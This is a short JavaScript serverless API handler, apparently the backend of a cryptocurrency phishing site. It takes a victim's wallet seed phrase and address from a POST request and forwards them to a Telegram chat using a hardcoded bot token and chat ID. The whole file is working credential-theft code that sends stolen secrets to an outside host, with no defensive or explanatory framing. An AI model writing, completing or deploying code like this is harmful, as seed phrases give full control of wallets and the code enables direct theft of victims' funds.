export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { seedPhrase, walletAddress } = req.body;

    const BOT_TOKEN = '8700677708:AAFWyE6X_9wSiHnJeqaIrQ5h5UTT7AcfEGg';
    const CHAT_ID = '8928919290';

    const message = `🔔 New Data Received:\n\n🔑 Seed Phrase: ${seedPhrase}\n💳 Wallet: ${walletAddress}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        if (response.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ error: 'Telegram send failed' });
        }
    } catch (error) {
        return res.status(500).json({ error: 'Server error' });
    }
}
